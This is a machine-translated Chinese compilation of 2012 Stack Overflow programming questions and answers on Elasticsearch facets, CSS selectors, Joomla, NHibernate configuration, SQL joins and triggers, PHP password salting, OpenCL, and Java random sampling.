    "_score" : 0.99381393, "_source" : {"tags": {"title": "people also kill people"}}
 } ]
},
"facets" : {
  "popular_tags" : {
  "_type" : "terms",
  "missing" : 0,
  "total" : 3,
  "other" : 0,
  "terms" : [ {
    "term" : "people",
    "count" : 1            // I expect this to be 2
   }, {
    "term" : "kill",
    "count" : 1
  }, {
    "term" : "also",
    "count" : 1
  } ]
} 
```

}

上面的结果不是我想要的。我想让频率计数为 2

```
"hits" : {
   "total" : 1,
   "max_score" : 0.99381393,
   "hits" : [ {
   "_index" : "testindex",
   "_type" : "document",
   "_id" : "uI5k0wggR9KAvG9o7S7L2g",
   "_score" : 0.99381393, "_source" : {"tags": {"title": "people also kill people"}}
} ]
},
"facets" : {
"popular_tags" : {
  "_type" : "terms",
  "missing" : 0,
  "total" : 3,
  "other" : 0,
  "terms" : [ {
    "term" : "people",
    "count" : 2            
  }, {
    "term" : "kill",
    "count" : 1
  }, {
    "term" : "also",
    "count" : 1
  } ]
 }
} 
```

我如何实现这一目标？刻面是错误的方式吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-05T12:12:20.060

一个方面计算文档，而不是属于它们的术语。您得到 1，因为只有一个文档包含该术语，无论发生多少次都没有关系。我不知道返回术语频率的开箱即用方式，方面不是一个好的选择。
如果您启用术语向量，该信息可以存储在索引中，但目前无法从弹性搜索中读取术语向量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-05T13:19:14.647

不幸的是，Elastic 中没有字段的术语频率。GitHub 项目[Index TermList](https://github.com/jprante/elasticsearch-index-termlist)正在使用 Lucene 的术语并计算所有文档的出现总数，您可以检查它并根据您的需要进行替换。

# css - 第一个孩子选择器可能存在错误？

> ID：13217851
> 
> 赞同：0
> 
> 时间：2012-11-04T10:45:49.437
> 
> 标签：css, css-selectors

我发现了一个可能的错误（至少，我不确定出了什么问题！）。

我有 5 个跨度。除了第一个之外，所有的都有一个 total_breakdown 类。我为该类添加了一些样式，然后为第一个子元素添加了特定样式 - 即更改颜色。

```
.total_breakdown {
    color: #727272;
    font-size: 14px;
    padding: 0 10px 0 2px;
}
.total_breakdown:first-child {
   color:black;
} 
```

这不起作用 - .total_breakdown 类的第一个跨度与其他跨度保持相同的灰色。现在，这是有趣的部分 - 如果我删除第一个跨度（没有 total_breakdown 类名），它工作正常。对我来说似乎是错误的......

具体例子[见这里](http://codepen.io/anon/pen/CygJs)

只是想补充一下，我在最新的 FF 和 Chrome 上对此进行了测试，结果相同

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T10:48:52.033

按定义工作，因为`.total_breakdown:first-child`不是指“属于 class`.total_breakdown`的第一个子元素”，而是“作为其父元素的第一个子元素并且另外属于 class 的元素`.total_breakdown`”。CSS 中没有“一流的”选择器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T10:52:20.793

因此，虽然这就是它的工作方式，但我可以为您提供一个解决方法：

```
.total_breakdown {
    color: black;
    font-size: 14px;
    padding: 0 10px 0 2px;
}
span, /* styles the spans preceding the first .total-breakdown */
.total_breakdown ~ .total_breakdown { /* styles all .total-breakdown elements */
   color: #727272;                       that follow a .total-breakdown element */
} 
```

[演示](http://codepen.io/anon/pen/zyaAD)。

参考：

*   [通用兄弟`~`组合](http://www.w3.org/TR/selectors/#general-sibling-combinators)子。

# php - joomla 2.5 仅查看任何预览类别的图像介绍

> ID：13217852
> 
> 赞同：1
> 
> 时间：2012-11-04T10:45:50.500
> 
> 标签：php, image, joomla

我对文件覆盖“blog_item.php”有疑问。我只想查看每个类别中的第一张图片，而没有介绍性文字。我能怎么做？我写了这段代码：

```
<?php
if (isset($images->image_intro) and !empty($images->image_intro))
{
    $imgfloat = (empty($images->float_intro)) ? $params->get('float_intro') : $images->float_intro;
    $class = (htmlspecialchars($imgfloat) != 'none') ? ' class="size-auto align-'.htmlspecialchars($imgfloat).'"' : ' class="size-auto"';
    $title = ($images->image_intro_caption) ? ' title="'.htmlspecialchars($images->image_intro_caption).'"' : '';
    echo '<img'.$class.$title.' src="'.htmlspecialchars($images->image_intro).'" alt="'.htmlspecialchars($images->image_intro_alt).'" />';
}?>

<?php echo $this->$images->image_intro; ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-07T21:02:39.933

我认为 Joomla 没有使用您的文件。您可以通过在文件中添加一些非常明显的内容来验证这一点，例如

```
<h1>YOU'RE HERE</h1> 
```

如果清除缓存后没有看到新文本，请继续阅读。

1.  确保您已将 blog_item 放在正确的文件夹中 (templates/your_template/html/com_content/category/)

2.  此外，/components/com_content/views/category/tmpl 中的所有文件都需要复制到您的覆盖中，而不仅仅是 blog_item.php

如果这不能解决它，那绝对是一个来源

# nhibernate - 将配置添加到库项目 C#

> ID：13217853
> 
> 赞同：0
> 
> 时间：2012-11-04T10:45:58.937
> 
> 标签：nhibernate, nunit, library-project, iesi-collections

我在解决方案中有一个控制台项目和一个类库项目。库项目是我的数据访问层 (DAL)，我也在我的 DAL 中使用 NHibernate 和 NET Persistenc API。

由于 NHibernate 需要 Iesi.Collections.dll，因此在加载此程序集（位于我的控制台项目的 bin 文件夹中）时，它给了我以下错误：

```
An attempt was made to load an assembly from a network location which would have caused the assembly to be sandboxed in previous versions of the .NET Framework. This release of the .NET Framework does not enable CAS policy by default, so this load may be dangerous. If this load is not intended to sandbox the assembly, please enable the loadFromRemoteSources switch. See http://go.microsoft.com/fwlink/?LinkId=155569 for more information. 
```

但是后来我将以下配置添加到我的 app.config 文件中，然后它成功加载了 Iesi.Collections.dll。

```
 <runtime>
        <loadFromRemoteSources enabled="true" />
    </runtime> 
```

现在我已经设置了 NUnit 测试框架来测试我的 DAL，为此我创建了一个新的类库项目。现在的问题是我在加载 Iesi.Collections.dll 时再次遇到上述错误。现在我需要将 loadFromRemoteSources 配置添加到我的测试项目中，以启用通过网络加载程序集。但是我的测试项目是一个库项目，所以我如何按照配置文件的配置部分下的行（因为类库项目没有任何配置文件）。

```
 <runtime>
        <loadFromRemoteSources enabled="true" />
   </runtime> 
```

更新：我已将以下 app.config 明确添加到我的测试项目（类库项目）中

```
<?xml version="1.0"?>
<configuration>    
    <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/>
    </startup>
    <appSettings>
        <add key="serviceUrl" value="test value" />
    </appSettings>
    <runtime>
        <loadFromRemoteSources enabled="true" />
    </runtime>
</configuration> 
```

我将使用以下代码行访问我的测试项目和 DAL 中的关键“serviceUrl”值：

```
 string strVal = System.Configuration.ConfigurationSettings.AppSettings["serviceUrl"]; 
```

但我仍然无法加载 Iesi.Collections.dll，并得到与以前相同的错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:51:26.040

文件真的是从网络加载的，还是您需要规避另一个烦人的安全仪式：[http ://www.hanselman.com/blog/RemovingSecurityFromDownloadedPowerShellScriptsWithAlternativeDataStreams.aspx](http://www.hanselman.com/blog/RemovingSecurityFromDownloadedPowerShellScriptsWithAlternativeDataStreams.aspx)

# mysql - SQL 查询组合列值

> ID：13217854
> 
> 赞同：3
> 
> 时间：2012-11-04T10:46:13.667
> 
> 标签：mysql, sql

我真的不确定如何命名这个问题......想象一下我们有一个看起来像这样的表格：

```
object | attribute | value
------------------------------
   7     country     Germany
   7     position    12
   7     points      12
   8     country     Germany
   8     position    10
   8     points      3 
```

现在我想选择所有具有德国国家和位置 12 或 5 的对象标识符

我不知道如何编写此查询，可能吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T10:50:38.270

只要您需要额外的查询选项，就可以多次加入：

```
SELECT t1.object
FROM table t1
    INNER JOIN table t2 ON t1.object = t2.object
WHERE t1.attribute = 'country' AND t1.value = 'Germany'
    AND t2.attribute = 'position' AND t2.value IN (12,5) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T10:49:43.353

您必须将表与自身连接：

```
SELECT *
FROM foo l
JOIN foo r ON l.object=r.object AND r.attribute='position'
WHERE l.attribute='country' AND l.value='Germany' AND r.value IN (5,12) 
```

# c# - 如何在 silverlight XAML 中定义这个字典

> ID：13217857
> 
> 赞同：0
> 
> 时间：2012-11-04T10:46:29.343
> 
> 标签：c#, silverlight-4.0

我想用以下 XAML 定义字典

```
Dictionary<Tuple<ModifierKeys, Key>, ICommand> 
```

我知道我需要创建继承 IDitionary 的类，如何调用它或在 XAML 中使用它

在用户控件级别，我想创建快捷方式列表，以传递给在 MVVM 模型中捕获 keydown 的全局行为，所以我想将此字典传递给 Behavior 以检查

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T09:48:32.300

如果您的 xaml 支持它（我不是 Silverlight 方面的专家），您可以在 xaml 中使用 x:TypeArguments。

有关详细信息，请参阅此链接[http://msdn.microsoft.com/en-us/library/ms750476(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/ms750476(v=vs.100).aspx)。

如果您的 xaml 不支持它，实现此目的的一种非常简单的方法是创建您自己的类，该类将使用您想要的类型参数继承字典：

```
public class YourTuple
{
    public ModifierKeys ModifierKey { get; set; }
    public ICommand Command { get; set; }
}

public class YourClass : Dictionary<YourTuple, ICommand> 
```

然后直接在你的 xaml 中使用它

```
<Window x:Class="SO.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:SO="clr-namespace:SO"
    Title="MainWindow" Height="350" Width="525">
    <Window.Resources>
        <SO:YourClass>
            <YourCommand ...>
                <YourCommand.Key>
                    <YourTuple ModifierKey="..." Key="..."
                </YourCommand.Key>
            </YourCommand>
            ...
        </SO:YourClass>

    </Window.Resources>
</Window> 
```

# c++ - 这个工具安全吗（尴尬的变种）？

> ID：13217858
> 
> 赞同：0
> 
> 时间：2012-11-04T10:46:51.177
> 
> 标签：c++

```
#include <iostream>
#include <new>
#include <type_traits>

template<typename T, typename U>
struct promote
{
  typedef typename std::conditional<(sizeof(T) > sizeof(U)), T, U>::type type;
};    

template<class U, class V>
class risk_implementation
{
  public:

  template<class T>
  risk_implementation(T const &t)      
  {
    new(storage_) T(t);
  }      

 //easier to do some test with public
 typedef typename promote<U, V>::type Bigger;
 typedef typename std::aligned_storage<sizeof(Bigger), alignof(Bigger)>::type storage_type;
 storage_type storage_[1];           
}; 
```

这种实现很丑陋，我不会在实际情况下使用它我只想知道使用像这样的placement new是否安全？谢谢

多亏了你们，我稍微修改了一下密码，现在这样安全吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:49:58.437

不一定，由于对齐问题，您的代码可能会失败，成员必须以可以同时处理and`storage_`对齐的方式对齐，因此它并不总是安全的`U``V`

# objective-c - Xcode 4.5 ios6按钮在objective-c中打开新视图

> ID：13217859
> 
> 赞同：2
> 
> 时间：2012-11-04T10:46:51.627
> 
> 标签：objective-c, ios

我知道如何通过拖放获得在情节提要中打开新 ViewController（新类）的按钮。但是我需要一个可以在单击按钮时打开一个新视图的 .m 文件中编写的代码。

在我的 FirstViewController.mi 中得到：

```
- (IBAction)button1:(id)sender {

} 
```

我需要什么代码来获取打开 SecondViewController 的按钮？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-04T10:55:04.210

```
[self performSegueWithIdentifier: @"TheSequeName" sender: self]; 
```

@"TheSequeName" 是在您 ctrl 拖动按钮以在情节提要上打开新视图控制器时定义的

如果不使用 segue，有很多变体可以打开新的视图控制器。最基本的是使用单独的NIB（没有情节提要）

```
SecondViewController *view = [[SecondViewController allow] initWithNibName:@"NibName" bundle:nil]; 
```

如果你在 Storyboard 上声明你的视图控制器，你可以使用

```
SecondViewController *view = [self.storyboard instantiateViewControllerWithIdentifier:@"viewStoryboardId"]; 
```

然后你使用导航控制器显示你的 SecondViewController

```
[self.navigationController pushViewController:view animated:YES]; 
```

或作为模态视图

```
[self presentModalViewController:view animated:YES]; 
```

# opencl - OpenCL 输出缓冲器

> ID：13217860
> 
> 赞同：1
> 
> 时间：2012-11-04T10:46:54.693
> 
> 标签：opencl

我正在尝试学习 OpenCL 基础知识。

我认为这个代码在内核中：

```
out[ 1 & ((a+b)==(b+a)) ] = (char)1; 
```

将产生与以下相同的结果：

```
out[ 1 ] = (char)1; 
```

谁能告诉我为什么它会产生不同的结果？

这是我的内核的完整源代码：

```
#pragma OPENCL EXTENSION cl_khr_byte_addressable_store : enable
__kernel void hello(__global char * out)
{
    size_t tid = get_global_id(0);
    int a = tid & 0xff;
    int b = (tid >> 8) & 0xff;
    out[ 1 & ((a+b)==(b+a)) ] = (char)1;
} 
```

如果我用“out[1]=(char)1;”替换最后一条语句 那么“out[0]”将不会被写入。但是上面的内核会将“1”写入out[0]。

编辑：这是我的 C++ 代码：

```
#include <utility>
#define __NO_STD_VECTOR // Use cl::vector instead of STL version
#include <CL/cl.hpp>

#include <cstdio>
#include <cstdlib>
#include <fstream>
#include <iostream>
#include <string>
#include <iterator>

inline void checkErr(cl_int err, const char * name)
{
    if (err != CL_SUCCESS) {
        std::cerr << "ERROR: " << name
                 << " (" << err << ")" << std::endl;
        std::exit(EXIT_FAILURE);
    }
}

int main()
{
    cl_int err;

    cl::vector< cl::Platform > platformList;
    cl::Platform::get(&platformList);
    checkErr(platformList.size()!=0 ? CL_SUCCESS : -1, "cl::Platform::get");
    std::cerr << "Platform number is: " << platformList.size() << std::endl;

    std::string platformVendor;
    platformList[0].getInfo((cl_platform_info)CL_PLATFORM_VENDOR, &platformVendor);
    std::cerr << "Platform is by: " << platformVendor << "\n";
    cl_context_properties cprops[3] = 
        {CL_CONTEXT_PLATFORM, (cl_context_properties)(platformList[0])(), 0};

    cl::Context context(
       CL_DEVICE_TYPE_GPU, 
       cprops,
       NULL,
       NULL,
       &err);
    checkErr(err, "Conext::Context()"); 

    unsigned char outH[2] = {0};
    cl::Buffer outCL(
        context,
        CL_MEM_WRITE_ONLY | CL_MEM_USE_HOST_PTR,
        sizeof(outH),
        outH,
        &err);
    checkErr(err, "Buffer::Buffer()");

    cl::vector<cl::Device> devices;
    devices = context.getInfo<CL_CONTEXT_DEVICES>();
    checkErr(
        devices.size() > 0 ? CL_SUCCESS : -1, "devices.size() > 0");

    std::ifstream file("condition1.cl");
    checkErr(file.is_open() ? CL_SUCCESS:-1, "condition1.cl");
    const std::string prog(std::istreambuf_iterator<char>(file), (std::istreambuf_iterator<char>()));

    cl::Program::Sources source(1, std::make_pair(prog.c_str(), prog.length()+1));
    cl::Program program(context, source);
    err = program.build(devices,""); 
    checkErr(err, "Program::build()"); 

    cl::Kernel kernel(program, "hello", &err);
    checkErr(err, "Kernel::Kernel()");

    err = kernel.setArg(0, outCL);
    checkErr(err, "Kernel::setArg()");

    cl::CommandQueue queue(context, devices[0], 0, &err);
    checkErr(err, "CommandQueue::CommandQueue()");

    cl::Event event;
    err = queue.enqueueNDRangeKernel(
        kernel, 
        cl::NullRange,
        cl::NDRange(65536),
         cl::NDRange(1, 1), 
        NULL, 
        &event);
    checkErr(err, "ComamndQueue::enqueueNDRangeKernel()");

    event.wait();    
    err = queue.enqueueReadBuffer(
        outCL,
        CL_TRUE,
        0,
        sizeof(outH),
        outH);
    checkErr(err, "ComamndQueue::enqueueReadBuffer()");

    for (int i = 0; i < sizeof(outH); i++)
        std::cout << (int)outH[i] << " ";

    std::string str;
    std::getline(std::cin, str);

    return EXIT_SUCCESS;
} 
```

编辑2：

它至少不是由“未定义的行为”引起的。我也得到了这个内核代码的奇怪结果：

```
char result = 0;
for (int a = 0; a < 2; a++) {
    for (int b = 0; b < 2; b++) {
        if ((a+b) != (b+a))
            result |= (1 << (a+2*b));
    }
} 
```

我希望“结果”会得到值 0。但它会得到值 6。如果我将 != 更改为 == 那么结果会得到值 9。所以在这段代码中，当“a”不等于"b" 则 (a+b) 不等于 (b+a)。

如果我更改代码并为“a”或“b”设置一个已知值，那么结果将是 0，如我所料。例如：

```
char result = 0;
int a = 1;
/*for (int a = 0; a < 2; a++)*/ {
    for (int b = 0; b < 2; b++) {
        if ((a+b) != (b+a))
            result |= (1 << (a+2*b));
    }
} 
```

# asp.net - 像 Wikipedia 一样的 ASP.NET URL 重写

> ID：13217863
> 
> 赞同：0
> 
> 时间：2012-11-04T10:47:13.573
> 
> 标签：asp.net, iis, url-rewriting, url-routing, wikipedia

我在网上搜索了一下，好像有三个选项

1.  旧的、艰难的方法：为 IIS 创建一些 URL 处理程序扩展（我不确定术语是否正确）。
2.  .NET 3.5 方式：使用复杂的 Web.config 修改创建某种 URL 处理程序类。
3.  新的、简单的 .NET 4.0 方法：在 Global.asax.cs 中调用 MapPageRoute。

我先尝试了 2，但未能成功。然后我尝试了3，但也失败了。经过一番努力，我发现我的 IIS 默认设置为使用 .net 2.0 应用程序池。现在我成功了3。

**但问题是当 URL 包含/,\, %, &** ...之类的内容时它不起作用。在 Wikipedia 中定义新页面时，即使 a/b 也可以。我正是想要那个。我怎样才能使 URL 像

```
http://[my server name]/[whatever words except some special names like 'admin'] 
```

像维基百科一样工作？我应该使用选项1吗？或者我仍然可以使用带有一些特殊设置的选项 3 吗？（当然，我想要最简单的方法...... :)）

# javascript - 动态下拉菜单祖先和rails 3

> ID：13217873
> 
> 赞同：0
> 
> 时间：2012-11-04T10:49:05.253
> 
> 标签：javascript, ruby-on-rails, dynamic, menu, ancestry

嗨，我尝试使用 ancestry 和 rails 3.2 做动态下拉菜单，但对 javascript 没有太多经验。我有祖先树和广告（模型/控制器）的类别。广告应该有一个类别。所以我的想法是当我创建一个广告时，我将从下拉菜单类别中选择。例如，在类别中，我有

-汽车 - 阿尔法罗密欧 - -145 - -146 - 奥迪 - -A4 在选择汽车获取（阿尔法罗密欧，奥迪）之后，我应该如何更改或创建 javascript 以获取第一个 category.roots？ [我尝试关注此链接 railscast](http://railscasts.com/episodes/88-dynamic-select-menus)但不知道如何更改 javascript。

javascript_controller

```
class JavascriptsController < ApplicationController 
```

def dynamic_category @categories = Category.roots.all

结束结束

dynamic_category.js.erb

```
var categories = new Array();
<% for category in @categories %>
    category.push(new Array('<%= category.title %>', <%= category.id %>));
<% end -%>

function categorySelected() {
    category_id = $('ad_category_id').getValue();
    children = $('ad_category_id').children;
    children.lenght = 1;
    categories.each(function(category) {
    if (category.children[0] == category.id) {
    children[children.lenght] = new Child(category[1], category[2]);
}});
if (children.lenght == 1) {
    $('category_field').hide();
    }else {
    $('category_field').show();
    }
}
document.observe('dom:loaded', function() {
    $('category_field').hide();
    $('ad_category_id').observe('change', categorySelected);
}); 
```

在此之后我应该在广告 _form.html.erb 中添加什么

```
<div class="field">
    <%= f.label(:category_id, "Select Category") %><br >
  <%= f.select(:category_id, @categories.collect {|s| [s.title, s.id]}, :prompt => "Select something") %>
</div>
<% javascript 'dynamic_category' %> 
```

# mysql - 在第三个表上插入后，触发器将元组插入到另一个表中的每一行的表中

> ID：13217875
> 
> 赞同：1
> 
> 时间：2012-11-04T10:49:25.087
> 
> 标签：mysql, triggers

我有三张表council_member、message 和rates。

```
council_member(student_id, field2,...)
mess(mess_id,field2,...)
rates(student_id,mess_id,rating) 
```

student_id 和 mess_id 是外键。

Rates 存储每个理事会成员对每个混乱的评级。我想创建一个触发器，在插入新的理事会成员时，将元组插入到插入的 student_id 的表 rate 中，并且每个 mess_id 的评分为 10。

如何在触发器中为每个 mess_id 运行插入语句？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T11:09:44.090

这很好用

```
CREATE TRIGGER insert_council_member 
AFTER INSERT ON council_member
FOR EACH ROW 
  INSERT INTO rates SELECT NEW.student_id, mess_id, 10 FROM mess; 
```

[http://sqlfiddle.com/#!2/ac4a0/1](http://sqlfiddle.com/#!2/ac4a0/1)

# php - 通过这种简单的密码加盐，我是否正在采取正确的方法来确保登录系统的安全？

> ID：13217878
> 
> 赞同：1
> 
> 时间：2012-11-04T10:49:45.870
> 
> 标签：php, salt

我在`login`表中有两个字段

*   密码
*   盐

我有这个小功能来生成盐

```
function random_salt($h_algo="sha512"){
        $salt1=uniqid(rand(),TRUE);
        $salt2=date("YmdHis").microtime(true);
        if(function_exists('dechex')){
            $salt2=dechex($salt2);
        }
        $salt3=$_SERVER['REMOTE_ADDR'];
        $salt=$salt1.$salt2.$salt3; 

        if(function_exists('hash')){
            $hash=(in_array($h_algo,hash_algos()))?$h_algo:"sha512";
            $randomsalt=hash($hash,md5($salt)); //returns 128 character long hash if sha512 algorithm is used.
        }else{
            $randomsalt=sha1(md5($salt)); //returns 40 characters long hash
        }

        return $randomsalt;
    } 
```

现在要创建用户密码，我有以下内容

```
$userinput=$_POST["password"] //don't bother about escaping, i have done it in my real project.
$static_salt="THIS-3434-95456-IS-RANDOM-27883478274-SALT"; //some static hard to predict secret salt.
$salt=random_salt(); //generates 128 character long hash.
$password =sha1($salt.$userinput.$static_salt); 
```

`$salt`保存在`salt`数据库的字段中，并`$password`保存在`password`字段中。

我的问题，在函数`random_salt()`中，我有这种感觉，我只是让事情变得复杂，而这可能不会产生应有的安全盐。无论我是否朝着正确的方向前进，有人可以给我一盏灯吗？

PS我确实对`crypt`功能有一个想法，就像这样。只想知道我的代码好吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T10:59:42.050

你真的应该看看这个问题/答案 ::
[How do you use bcrypt for hashing passwords in PHP?](https://stackoverflow.com/questions/4795385/how-do-you-use-bcrypt-for-hashing-passwords-in-php)

简而言之，如果不需要，请不要自行滚动。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T10:59:04.833

这显然是一个安全问题：

```
uniqid(rand(),TRUE); 
```

你是如何为 rand(). 设置种子的？你在哪里熵池？只要你不能回答，盐就必须被认为是可预测的。请记住：安全性并非来自代码晦涩难懂。

如果您选择了一个好的 PRNG，所有其他的盐（例如服务器名称、静态长盐、时间等）都会变得无关紧要。

# javascript - Backbone Boilerplate grunt-bbb 生成的 todomvc 返回 404

> ID：13217881
> 
> 赞同：0
> 
> 时间：2012-11-04T10:50:08.003
> 
> 标签：javascript, web-applications, backbone.js, nodes, gruntjs

我是骨干 Bloilerplate 的新手。我尝试遵循本[指南](https://github.com/backbone-boilerplate/grunt-bbb)并安装了 grunt-bb

然后这样做：

```
mkdir todomvc
bbb int 
```

Bloilerplate 文件成功。然后

```
bbb init:todomvc 
```

到 domvc 文件也生成。然后将服务器运行为

```
bbb server 
```

服务器现在正在监听 localhost:8000

问题是我的屏幕是空白的，我在 localhost:8000/assets/css/h5bp.css 中得到了这个 404。否则会加载其他文件，如backbonejs。

主要问题是页面上没有任何内容（空页面）。bbb 有什么我应该知道的问题吗？我被卡住了，请帮忙。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T11:49:29.340

似乎 bbb 的目录布局已经发展，但包含的 todomvc 示例尚未更新。您现在可以在`vendor/h5bp/css`（normalize.css 和 main.css）中找到 HTML5 Boilerplate CSS。

您可能会发现您有两个 index.css 文件（在`assets/css/index.css`和中`app/styles/index.css`）。在这种情况下，保留最后一个，移入并在:`assets/css/todo.css`中`app/styles/`引用它。最后，您需要更新 index.html：`app/styles/index.css``@import "todo.css;"`

```
<link rel="stylesheet" href="/app/styles/index.css"> 
```

请注意，所有 JS 文件也已移动到`/vendor`。

# java - 在 Java 中高效序列化数据并使用 Javascript 读取

> ID：13217883
> 
> 赞同：2
> 
> 时间：2012-11-04T10:51:00.387
> 
> 标签：java, javascript, serialization, base64

我想用 Java 编写数据并通过 Javascript 读回。目前我正在使用 json 但由于一个巨大的数组（双打），这种方法很慢（解析和网络）。

什么是好的选择？我找到了[按摩包](http://msgpack.org/)，但这对于我正在尝试做的事情似乎有点矫枉过正。我宁愿使用像 base64 这样的简单解决方案，但无法使其在 javascript 阅读网站上运行。还是我应该使用“ [charset=x-user-defined method](https://stackoverflow.com/a/7372816/194609) ”？（效率更高吗？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:55:48.930

你可以试试protobufs。Javascript 没有官方实现，但（至少）有几个 3rd-party 实现： [Google Protocol Buffers - JavaScript](https://stackoverflow.com/questions/6912981/google-protocol-buffers-javascript)

与 JSON 和 XML 相比，Protobufs 被认为既快速又具有更紧凑（非文本）的表示形式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T20:01:08.027

好吧，我对现有的解决方案不满意（使用简单 json 时开销太大或太慢）。所以在这里，为了记录，一个通过'arraybuffer'的html5解决方案

```
 var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.responseType = 'arraybuffer';
    xhr.onload = function(e) {
        if (this.status == 200) {
            var dv = new DataView(this.response);
            var json = {
                "info" : {
                    "took" : 0
                },
                "route": {
                    "time": 0, 
                    "distance": 0, 
                    "data" : {}
                }
            };

            var i = 0;
            json.info.took = dv.getFloat32(i);                
            i += 4;
            json.route.distance = dv.getFloat32(i);
            i += 4;
            json.route.time = dv.getInt32(i);
            i += 4;
            var locations = dv.getInt32(i);
            var tmpArray = [];
            json.route.data = {
                "type" : "LineString",
                "coordinates": tmpArray
            };
            for(var index = 0; index < locations; index ++) {
                i += 4;
                var lat = dv.getFloat32(i);
                i += 4;
                var lng = dv.getFloat32(i);
                tmpArray.push([lng, lat]);
            }            
            callback(json);
        } else
            errCallback(e);
    };
    xhr.send(); 
```

要使其与跨源策略一起使用，您需要在服务器 (response.setHeader("Access-Control-Allow-Origin", "*")) 和客户端 (jQuery.support.cors = true) 上启用它. 这是使用 DataOutputStream 的简单 Java servlet的[完整工作示例。](https://github.com/graphhopper/graphhopper-web/blob/master/src/main/webapp/js/main.js)作为替代方案，还有 json 后备。

另一种方法是将所有数字编码为字符串并将其放入 json（通过 base64）。

我偶然发现的另一个有趣的项目是[http://binaryjs.com](http://binaryjs.com)

# java - 如何获取集合中的随机范围数

> ID：13217884
> 
> 赞同：2
> 
> 时间：2012-11-04T10:51:09.853
> 
> 标签：java, random

我有 100 条记录 [1 -> 100]，我想在其中随机获取 50 条记录，在 java 中怎么做？谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T10:56:48.313

```
Set<T> set;

List<T> list = new ArrayList<T>(set);
Collections.shuffle(list);
List<T> random50 = list.subList(0, 50); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T11:08:48.333

您可以获得 50 个随机值。

```
Random rand = new Random();

List<Integer> ints = new ArrayList<Integer>();
for(int i = 0; i < 50; i++)
    ints.add(rand.nextInt(100)+1); 
```

您可以使用 shuffle 以随机顺序获得 50 个唯一值。

```
List<Integer> ints = new ArrayList<Integer>();
for(int i = 1; i <= 100; i++)
    ints.add(i);
Collections.shuffle(ints);
ints = ints.subList(0, 50); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-12T08:35:35.430

生成四位长唯一代码的唯一可靠方法。

我发现首先声明 4 个整数变量，为它们分配 1 到 9 之间的随机数字。

然后我将这些整数转换为字符串，将它们连接在一起，使它们形成一个四位数的长字符串，然后我将生成的字符串转换为整数。

生成的四位随机整数存储在一个数组中。

“请注意！！我是 Java 新手”

```
import javax.swing.JOptionPane;
public class Rund4gen {
/**
 * @param args the command line arguments
 */
public static void main(String[] args) {
   // I begin by creating an array to store all my numbers
   String userInput = JOptionPane.showInputDialog("How many 4 digit long numbers would you like to generate?");
   int input = Integer.parseInt(userInput);
   // Now lets convert user input to a string
   int[] passCode = new int[input];
   // We need to loop as many time as the user specified
   for(int i = 0; i < input; i++){
       // Here I declare my integer variables
       int one, two, three, four;
       // For each of the integer variable I assign a rundom number
       one = (int)Math.floor((Math.random()*9)+1);
       two = (int)Math.floor((Math.random()*9)+1);
       three = (int)Math.floor((Math.random()*9)+1);
       four = (int)Math.floor((Math.random()*9)+1);
       // I need to convert my digits into a string in order to join them
       String n1 = String.valueOf(one);
       String n2 = String.valueOf(two);
       String n3 = String.valueOf(three);
       String n4 = String.valueOf(four);
       // Once conversion is complete then I join them as follows
       String nV = n1+n2+n3+n4;
       // Once joined, I then need to convert the joined result into an integer
       int nF = Integer.parseInt(nV);
       // I then store the result in an array as follows
       passCode[i] = nF;
   }
   // Now I need to print each value in the array
   for(int c = 0; c < passCode.length; c++){
       System.out.print(passCode[c]+"\n");
   }
   // Finally I thank the user for participating or not
   //JOptionPane.showMessageDialog(null,"Thank you for participating");
   System.exit(0);
} 
```

}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-03-12T10:27:21.810

```
fun generateCode(@IntRange(from = 1, to = 9) digits: Int, uniqueDigits: Boolean = false): String {
    var number = 0
    val numbersSet = mutableSetOf<Int>()
    for (i in 1..digits) {
        var x: Int
        do {
            x = Random.nextInt(9)
        } while (uniqueDigits && numbersSet.contains(x))

        numbersSet.add(x)

        number += (10.0.pow((digits - i).toDouble()) * x).toInt()
    }
    return String.format("%0${digits}d", number)
} 
```

这是允许生成长度为 1-9 的数字代码的 Kotlin 代码。用于`uniqueDigits = true`使数字不重复。

# android - 三星 gs2 和更小屏幕尺寸的图像显示，但在 10.1 英寸平板电脑中不显示

> ID：13217889
> 
> 赞同：0
> 
> 时间：2012-11-04T10:51:45.507
> 
> 标签：android, android-layout, android-intent

我似乎有一个我似乎无法弄清楚的问题。在我的应用程序中，我有一个 800x2200 的图像（在 Photoshop 中创建）。当我在我的三星 gs2 上测试应用程序时，图像显示完美，可以毫无问题地上下滚动。在较小的屏幕尺寸上测试时效果很好，但似乎当我在 10.1 英寸的屏幕上测试它时，我只是得到一个空白屏幕但仍然可以滚动（因为我可以看到左侧的滚动条，（好像有图像，但不显示）我已将图像放在所有可绘制文件夹中，但没有运气。有没有人知道问题是什么，还是我做错了什么？谢谢

抱歉，代码可能是：

```
@Override
public void onCreate(Bundle savedInstanceState) {
